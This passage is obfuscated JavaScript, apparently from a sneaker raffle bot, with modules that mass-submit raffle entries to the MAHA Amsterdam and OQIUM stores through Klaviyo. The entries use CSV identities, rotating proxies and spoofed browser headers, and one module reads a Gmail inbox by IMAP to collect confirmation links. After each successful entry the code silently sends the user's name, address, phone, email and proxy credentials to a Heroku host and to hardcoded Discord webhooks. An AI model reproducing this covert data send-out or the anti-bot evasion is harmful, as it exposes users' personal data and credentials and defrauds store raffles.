                                console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x5801a6['name'] + ']\x20Task\x20' + (_0x51037c + 0x1) + '\x20:\x20Retrying\x20(' + _0x14f443 + '\x20/\x205)')), _0x51037c = _0x51037c - 0x1, _0x14f443 = _0x14f443 + 0x1;
                                continue;
                            }
                            _0x21e7b3 == 'yes' && _0x14f443 >= 0x5 && (_0x260c2d(_0x511c22[_0x51037c], _0x5801a6), _0x21e7b3 = 'no', _0x14f443 = 0x0), console['log']('Waiting\x20for\x20' + _0x4acd48['AfewDelay'] + '\x20ms'), await _0x505897(_0x4acd48['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RvxrAV',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WQN5XR',
                                '$consent_form_version': 0x7f7254,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x20f42f, _0x30b547, _0x8a1da3) {
                    for (var _0xdeb312 = 0x0; _0xdeb312 < _0x30b547['length']; _0xdeb312++) {
                        try {
                            await _0x43797b(_0x30b547, _0xdeb312);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x19a097(_0x2ce68b, _0x299f25, _0x2f05b5, _0x49af80, _0x24d8f3) {
                            var _0xd4e227, _0x5e8bc2 = {}, _0x1a8df5 = [], _0x54a8fb = {}, _0x1175da = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x4aa155 = Math['round'](Math['random']() * (_0x1175da['length'] - 0x1));
                            !_0x49af80 && (_0x49af80 = {});
                            if (_0x299f25 != 'ver') {
                                _0x4041fe(_0x2f05b5['name'] + '\x20Task\x20' + (_0x2ce68b + 0x1) + '\x20/\x20' + _0x49af80['length'] + '\x20||\x20File:\x20' + _0x22c4ed + '\x20Proxies:\x20' + _0x5a9fd8), await _0x43797b(_0x49af80, _0x2ce68b), _0x5e8bc2 = _0x2f05b5['data'], _0x5e8bc2['data']['attributes']['email'] = '' + _0x49af80[_0x2ce68b]['Email'];
                                if (_0x49af80[_0x2ce68b]['Size'] == 'RANDOM') {
                                }
                                _0x5e8bc2['data']['attributes']['properties']['$first_name'] = '' + _0x49af80[_0x2ce68b]['FirstName'], _0x5e8bc2['data']['attributes']['properties']['$last_name'] = '' + _0x49af80[_0x2ce68b]['LastName'], _0x5e8bc2['data']['attributes']['properties']['$address1'] = _0x49af80[_0x2ce68b]['Address1'] + '\x20' + _0x49af80[_0x2ce68b]['Address2'] + '\x20' + _0x49af80[_0x2ce68b]['HouseNumber'], _0x5e8bc2['data']['attributes']['properties']['$zip'] = '' + _0x49af80[_0x2ce68b]['Zip'], _0x5e8bc2['data']['attributes']['properties']['$city'] = '' + _0x49af80[_0x2ce68b]['City'], _0x5e8bc2['data']['attributes']['properties']['$country'] = '' + _0x49af80[_0x2ce68b]['Country'], _0x49af80[_0x2ce68b]['Size'] == 'RANDOM' ? _0x5e8bc2['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x1175da[_0x4aa155] : _0x5e8bc2['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x49af80[_0x2ce68b]['Size'], _0x5e8bc2['data']['attributes']['properties']['$phone_number'] = '' + _0x49af80[_0x2ce68b]['Phone'], _0x5e8bc2['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x49af80[_0x2ce68b]['Follower'];
                            }
                            if (_0x4acd48['useRandomProxy'] = ![])
                                var _0x25a22d = _0x24d8f3[_0x2ce68b]['split'](':');
                            else
                                var _0x18630f = Math['round'](Math['random']() * (_0x24d8f3['length'] - 0x1)), _0x25a22d = _0x24d8f3[_0x18630f]['split'](':');
                            var _0x5c1ae9 = {
                                'jar': _0x433f70,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x2f05b5['url'],
                                'headers': _0x2f05b5['headers'],
                                'body': JSON['stringify'](_0x5e8bc2),
                                'proxy': 'http://' + _0x25a22d[0x2] + ':' + _0x25a22d[0x3] + '@' + _0x25a22d[0x0] + ':' + _0x25a22d[0x1]
                            };
                            return _0x299f25 != 'ver' && (_0x5c1ae9['url'] = _0x2f05b5['url'], _0x5c1ae9['headers'] = _0x2f05b5['headers']), _0x299f25 == 'ver' && (_0x5c1ae9['method'] = 'GET'), new Promise(function (_0x93651e, _0xf1aac0) {
                                callback = async (_0x5736d6, _0x4d67ca, _0xe8b2ed) => {
                                    if (!_0x5736d6 && _0x4d67ca['statusCode'] == 0xca || !_0x5736d6 && _0x4d67ca['statusCode'] == 0xc8) {
                                        if (_0x299f25 != 'ver') {
                                            var _0x57edca = await _0x429bf8(_0x49af80[_0x2ce68b], _0x2f05b5, 'dev', ![]), _0x4928ce = await _0x429bf8(_0x49af80[_0x2ce68b], _0x2f05b5, 'pub', ![]);
                                            const _0x332765 = {
                                                'succesDEVMSG': { 'embeds': [_0x57edca] },
                                                'succesPUBMSG': { 'embeds': [_0x4928ce] }
                                            };
                                            let _0x56652a = _0x49af80[_0x2ce68b];
                                            try {
                                                prxdata = {
                                                    'username': _0xdaef84['replace']('#', ''),
                                                    'module': _0x2f05b5['name'],
                                                    'entrydata': JSON['stringify'](_0x56652a),
                                                    'proxy': '' + _0x24d8f3[_0x2ce68b]
                                                };
                                                var _0x189384 = JSON['stringify'](prxdata);
                                                let _0x147557 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x577975['post']('https://jraffles.herokuapp.com/success', _0x189384, _0x147557);
                                            } catch (_0x554f8a) {
                                            }
                                            if (_0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '')
                                                try {
                                                    await _0x1abce0(_0x4acd48['webhook'], _0x332765['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x505897(0xc8), await _0x1abce0(_0x5640fd, _0x332765['succesDEVMSG']), await _0x505897(0xc8);
                                            try {
                                                await _0x1abce0(_0x1b595f, _0x332765['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x11df74(_0x49af80[_0x2ce68b], _0x2f05b5);
                                        }
                                        _0x93651e(console['log'](_0x4e59da['green'](_0x3b5c2b() + '\x20[' + _0x2f05b5['name'] + ']\x20Task\x20' + (_0x2ce68b + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x299f25 != 'ver') {
                                            var _0x3453c7 = '' + _0x5736d6, _0xcc8018 = await _0x429bf8(_0x49af80[_0x2ce68b], _0x2f05b5, 'dev', !![], _0x3453c7), _0x4a5500 = {};
                                            _0x4a5500['errorDEV'] = { 'embeds': [_0xcc8018] }, _0x260c2d(_0x49af80[_0x2ce68b], _0x2f05b5), _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x4a5500['errorDEV']), await _0x1abce0(_0x3b044a, _0x4a5500['errorDEV']);
                                        }
                                        _0xf1aac0(console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x2f05b5['name'] + ']\x20Task\x20' + (_0x2ce68b + 0x1) + ':\x20' + _0x5736d6)));
                                    }
                                };
                                try {
                                    _0x299f25 != 'ver' && console['log'](_0x3b5c2b() + '\x20[' + _0x2f05b5['name'] + ']\x20Task\x20' + (_0x2ce68b + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x5e8bc2['data']['attributes']['email']), _0x1d169b(_0x5c1ae9, callback);
                                } catch (_0x1c877e) {
                                    console['log'](_0x3b5c2b() + '\x20Task\x20' + (_0x2ce68b + 0x1) + ':\x20' + _0x1c877e);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x19a097(_0xdeb312, 'nor', _0x20f42f, _0x30b547, _0x8a1da3), console['log'](_0x3b5c2b() + '\x20[' + _0x20f42f['name'] + ']\x20Sleeping\x20for\x20' + _0x4acd48['delay'] + '\x20ms'), await _0x505897(_0x4acd48['delay']);
                        } catch (_0x5b4dd1) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x1bedbc, _0x8c7245, _0x109997) {
                    var _0x3ec7f1 = [], _0x66813a = ![];
                    async function _0x44c235() {
                        var _0x2760f3 = new _0x196441({
                            'user': _0x4acd48['masterMail'],
                            'password': _0x4acd48['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x1a0c97(_0x32e10a) {
                            _0x2760f3['openBox']('INBOX', ![], _0x32e10a);
                        }
                        _0x2760f3['once']('ready', function () {
                            _0x1a0c97(function (_0x343d73, _0x44b0ef) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x343d73)
                                    throw _0x343d73;
                                _0x2760f3['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x286722, _0x4386f9) {
                                    if (!_0x4386f9 || !_0x4386f9['length'])
                                        console['log'](_0x3b5c2b() + '\x20[' + _0x1bedbc['name'] + ']\x20No\x20mails\x20found'), _0x2760f3['end']();
                                    else {
                                        var _0x5da27c = _0x2760f3['seq']['fetch'](_0x4386f9, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x5da27c['on']('message', function (_0x3efc98, _0x439511) {
                                            var _0x57c03b = '(#' + _0x439511 + ')\x20';
                                            _0x3efc98['on']('body', function (_0x376100, _0x11b975) {
                                                _0x158053(_0x376100, (_0xe28a33, _0x118f8e) => {
                                                    var _0x8becf5 = _0x118f8e['text']['split']('(')[0x1], _0x32e21b = _0x8becf5['split'](')')[0x0];
                                                    _0x3ec7f1['push'](_0x32e21b);
                                                });
                                            }), _0x3efc98['once']('end', function () {
                                            });
                                        }), _0x5da27c['once']('error', function (_0x3dd777) {
                                            console['log']('Fetch\x20error:\x20' + _0x3dd777), _0x66813a = !![];
                                        }), _0x5da27c['once']('end', function () {
                                            _0x2760f3['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x2760f3['once']('error', function (_0x17d717) {
                            console['log'](_0x4e59da['red'](_0x17d717['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x66813a = !![];
                        }), _0x2760f3['once']('end', async function () {
                            _0x66813a = !![];
                        }), _0x2760f3['connect']();
                    }
                    async function _0x19c028(_0x1fdcdd, _0x3dea45, _0x54df7e) {
                        for (var _0x2ba1b3 = 0x0; _0x2ba1b3 < _0x3dea45['length']; _0x2ba1b3++) {
                            async function _0xde051f(_0x988a3d, _0x316a3c, _0x42ba1d, _0x848b8, _0xac8ecc) {
                                var _0x2deae9, _0x17ca15 = {}, _0x32eae1 = [], _0x3f503b = {}, _0x3ebbf3 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x5d3ceb = Math['round'](Math['random']() * (_0x3ebbf3['length'] - 0x1));
                                _0x848b8[_0x988a3d]['Size'] == 'RANDOM' && (_0x848b8[_0x988a3d]['Size'] = _0x3ebbf3[_0x5d3ceb]);
                                !_0x848b8 && (_0x848b8 = {});
                                if (_0x4acd48['useRandomProxy'] = ![])
                                    var _0x3803d7 = _0xac8ecc[_0x988a3d]['split'](':');
                                else
                                    var _0x2468b2 = Math['round'](Math['random']() * (_0xac8ecc['length'] - 0x1)), _0x3803d7 = _0xac8ecc[_0x2468b2]['split'](':');
                                var _0x37fdbf = {
                                    'jar': _0x433f70,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x42ba1d['url'],
                                    'headers': _0x42ba1d['headers'],
                                    'body': JSON['stringify'](_0x17ca15),
                                    'proxy': 'http://' + _0x3803d7[0x2] + ':' + _0x3803d7[0x3] + '@' + _0x3803d7[0x0] + ':' + _0x3803d7[0x1]
                                };
                                return _0x316a3c != 'ver' && (_0x37fdbf['url'] = _0x42ba1d['url'], _0x37fdbf['headers'] = _0x42ba1d['headers']), _0x316a3c == 'ver' && (_0x37fdbf['method'] = 'GET', _0x37fdbf['url'] = _0x848b8[_0x988a3d]), new Promise(function (_0x50edc2, _0x5ab0a3) {
                                    callback = async (_0x32f80f, _0x27fcf6, _0x21a5be) => {
                                        if (!_0x32f80f && _0x27fcf6['statusCode'] == 0xca || !_0x32f80f && _0x27fcf6['statusCode'] == 0xc8) {
                                            if (_0x316a3c != 'ver') {
                                                var _0x2c8d8f = await _0x429bf8(_0x848b8[_0x988a3d], _0x42ba1d, 'dev', ![]), _0x4d48b8 = await _0x429bf8(_0x848b8[_0x988a3d], _0x42ba1d, 'pub', ![]);
                                                const _0x437fd1 = {
                                                    'succesDEVMSG': { 'embeds': [_0x2c8d8f] },
                                                    'succesPUBMSG': { 'embeds': [_0x4d48b8] }
                                                };
                                                if (_0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '')
                                                    try {
                                                        await _0x1abce0(_0x4acd48['webhook'], _0x437fd1['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x505897(0xc8), await _0x1abce0(_0x5640fd, _0x437fd1['succesDEVMSG']), await _0x505897(0xc8);
                                                try {
                                                    await _0x1abce0(_0x1b595f, _0x437fd1['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x11df74(_0x848b8[_0x988a3d], _0x42ba1d);
                                            }
                                            _0x50edc2(console['log'](_0x4e59da['green'](_0x3b5c2b() + '\x20[' + _0x42ba1d['name'] + ']\x20Task\x20' + (_0x988a3d + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x316a3c != 'ver') {
                                                var _0x3716bc = '' + _0x32f80f, _0x53c383 = await _0x429bf8(_0x848b8[_0x988a3d], _0x42ba1d, 'dev', !![], _0x3716bc), _0x4cf627 = {};
                                                _0x4cf627['errorDEV'] = { 'embeds': [_0x53c383] }, _0x260c2d(_0x848b8[_0x988a3d], _0x42ba1d), _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x4cf627['errorDEV']), await _0x1abce0(_0x3b044a, _0x4cf627['errorDEV']);
                                            }
                                            _0x5ab0a3(console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x42ba1d['name'] + ']\x20Task\x20' + (_0x988a3d + 0x1) + ':\x20' + _0x32f80f)));
                                        }
                                    };
                                    try {
                                        _0x316a3c != 'ver' ? console['log'](_0x3b5c2b() + '\x20[' + _0x42ba1d['name'] + ']\x20Task\x20' + (_0x988a3d + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x17ca15['data']['attributes']['email']) : console['log'](_0x3b5c2b() + '\x20[' + _0x42ba1d['name'] + ']\x20Task\x20' + (_0x988a3d + 0x1) + ':\x20Fetching\x20Response'), _0x1d169b(_0x37fdbf, callback);
                                    } catch (_0x3156b9) {
                                        console['log'](_0x3b5c2b() + '\x20Task\x20' + (_0x988a3d + 0x1) + ':\x20' + _0x3156b9);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0xde051f(_0x2ba1b3, 'ver', _0x1fdcdd, _0x3dea45, _0x54df7e), console['log'](_0x3b5c2b() + '\x20[' + _0x1fdcdd['name'] + ']\x20Sleeping\x20for\x20' + _0x4acd48['delay'] + '\x20ms'), await _0x505897(_0x4acd48['delay']);
                            } catch (_0x2d6648) {
                            }
                        }
                    }
                    try {
                        _0x44c235();
                        while (!_0x66813a) {
                            await _0x505897(0xbb8);
                        }
                        console['log']('Found\x20' + _0x3ec7f1['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x505897(0x9c4);
                    }
                    await _0x19c028(_0x1bedbc, _0x3ec7f1, _0x109997);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'R8PmER',
                            'custom_source': 'DR5415-103',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'R6z7uT',
                                '$consent_form_version': 0x833bbb,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x28000e, _0x278090, _0x49a1a3) {
                    for (var _0x40bbfb = 0x0; _0x40bbfb < _0x278090['length']; _0x40bbfb++) {
                        try {
                            await _0x43797b(_0x278090, _0x40bbfb);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x19fc20(_0x14c539, _0x90d2d8, _0x422094, _0x2247d6, _0x355484) {
                            var _0x20c424, _0x36a169 = {}, _0x81dfd3 = [], _0x41707a = {}, _0x59be29 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0xa0220f = Math['round'](Math['random']() * (_0x59be29['length'] - 0x1));
                            !_0x2247d6 && (_0x2247d6 = {});
                            if (_0x90d2d8 != 'ver') {
                                _0x4041fe(_0x422094['name'] + '\x20Task\x20' + (_0x14c539 + 0x1) + '\x20/\x20' + _0x2247d6['length'] + '\x20||\x20File:\x20' + _0x22c4ed + '\x20Proxies:\x20' + _0x5a9fd8), _0x81dfd3 = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0xdaef84
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0x2247d6[_0x14c539]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x4acd48['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0x5d34b4
                                        }
                                    ]
                                }], _0x41707a = { 'embeds': _0x81dfd3 }, _0x36a169 = _0x422094['data'], _0x36a169['data']['attributes']['email'] = '' + _0x2247d6[_0x14c539]['Email'];
                                if (_0x2247d6[_0x14c539]['Size'] == 'RANDOM') {
                                }
                                _0x36a169['data']['attributes']['properties']['$first_name'] = '' + _0x2247d6[_0x14c539]['FirstName'], _0x36a169['data']['attributes']['properties']['$last_name'] = '' + _0x2247d6[_0x14c539]['LastName'], _0x36a169['data']['attributes']['properties']['$address1'] = _0x2247d6[_0x14c539]['Address1'] + '\x20' + _0x2247d6[_0x14c539]['Address2'] + '\x20' + _0x2247d6[_0x14c539]['HouseNumber'], _0x36a169['data']['attributes']['properties']['$zip'] = '' + _0x2247d6[_0x14c539]['Zip'], _0x36a169['data']['attributes']['properties']['$city'] = '' + _0x2247d6[_0x14c539]['City'], _0x36a169['data']['attributes']['properties']['$country'] = '' + _0x2247d6[_0x14c539]['Country'], _0x2247d6[_0x14c539]['Size'] == 'RANDOM' ? _0x36a169['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x59be29[_0xa0220f] : _0x36a169['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x2247d6[_0x14c539]['Size'], _0x36a169['data']['attributes']['properties']['$phone_number'] = '' + _0x2247d6[_0x14c539]['Phone'], _0x36a169['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x2247d6[_0x14c539]['Follower'];
                            }
                            if (_0x4acd48['useRandomProxy'] = ![])
                                var _0x1923a2 = _0x355484[_0x14c539]['split'](':');
                            else
                                var _0xf0149f = Math['round'](Math['random']() * (_0x355484['length'] - 0x1)), _0x1923a2 = _0x355484[_0xf0149f]['split'](':');
                            var _0x1c5778 = {
                                'jar': _0x433f70,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x422094['url'],
                                'headers': _0x422094['headers'],
                                'body': JSON['stringify'](_0x36a169),
                                'proxy': 'http://' + _0x1923a2[0x2] + ':' + _0x1923a2[0x3] + '@' + _0x1923a2[0x0] + ':' + _0x1923a2[0x1]
                            };
                            return _0x90d2d8 != 'ver' && (_0x1c5778['url'] = _0x422094['url'], _0x1c5778['headers'] = _0x422094['headers']), _0x90d2d8 == 'ver' && (_0x1c5778['method'] = 'GET'), new Promise(function (_0x4ed8b4, _0x8affe6) {
                                callback = async (_0x1a71d7, _0x7f2eb2, _0x45621e) => {
                                    if (!_0x1a71d7 && _0x7f2eb2['statusCode'] == 0xca || !_0x1a71d7 && _0x7f2eb2['statusCode'] == 0xc8) {
                                        if (_0x90d2d8 != 'ver') {
                                            var _0x432492 = await _0x429bf8(_0x2247d6[_0x14c539], _0x422094, 'dev', ![]), _0x527db9 = await _0x429bf8(_0x2247d6[_0x14c539], _0x422094, 'pub', ![]);
                                            const _0x1e0fc8 = {
                                                'succesDEVMSG': { 'embeds': [_0x432492] },
                                                'succesPUBMSG': { 'embeds': [_0x527db9] }
                                            };
                                            let _0x5b9f74 = _0x2247d6[_0x14c539];
                                            try {
                                                prxdata = {
                                                    'username': _0xdaef84['replace']('#', ''),
                                                    'module': _0x422094['name'],
                                                    'entrydata': JSON['stringify'](_0x5b9f74),
                                                    'proxy': '' + _0x355484[_0x14c539]
                                                };
                                                var _0x5e524f = JSON['stringify'](prxdata);
                                                let _0x18e4a5 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x577975['post']('https://jraffles.herokuapp.com/success', _0x5e524f, _0x18e4a5);
                                            } catch (_0x3ee569) {
                                            }
                                            if (_0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '')
                                                try {
                                                    await _0x1abce0(_0x4acd48['webhook'], _0x1e0fc8['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x505897(0xc8), await _0x1abce0(_0x5640fd, _0x1e0fc8['succesDEVMSG']), await _0x505897(0xc8);
                                            try {
                                                await _0x1abce0(_0x1b595f, _0x1e0fc8['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x11df74(_0x2247d6[_0x14c539], _0x422094);
                                        }
                                        _0x4ed8b4(console['log'](_0x4e59da['green'](_0x3b5c2b() + '\x20[' + _0x422094['name'] + ']\x20Task\x20' + (_0x14c539 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x90d2d8 != 'ver') {
                                            var _0xc05c08 = '' + _0x1a71d7, _0x389e80 = await _0x429bf8(_0x2247d6[_0x14c539], _0x422094, 'dev', !![], _0xc05c08), _0x35d189 = {};
                                            _0x35d189['errorDEV'] = { 'embeds': [_0x389e80] }, _0x260c2d(_0x2247d6[_0x14c539], _0x422094), _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x35d189['errorDEV']), await _0x1abce0(_0x3b044a, _0x35d189['errorDEV']);
                                        }
                                        _0x8affe6(console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x422094['name'] + ']\x20Task\x20' + (_0x14c539 + 0x1) + ':\x20' + _0x1a71d7)));
                                    }
                                };
                                try {
                                    _0x90d2d8 != 'ver' && console['log'](_0x3b5c2b() + '\x20[' + _0x422094['name'] + ']\x20Task\x20' + (_0x14c539 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x36a169['data']['attributes']['email']), _0x1d169b(_0x1c5778, callback);
                                } catch (_0xc59c35) {
                                    console['log'](_0x3b5c2b() + '\x20Task\x20' + (_0x14c539 + 0x1) + ':\x20' + _0xc59c35);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x19fc20(_0x40bbfb, 'nor', _0x28000e, _0x278090, _0x49a1a3), console['log'](_0x3b5c2b() + '\x20[' + _0x28000e['name'] + ']\x20Sleeping\x20for\x20' + _0x4acd48['delay'] + '\x20ms'), await _0x505897(_0x4acd48['delay']);
                        } catch (_0xf3ea03) {
                        }
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
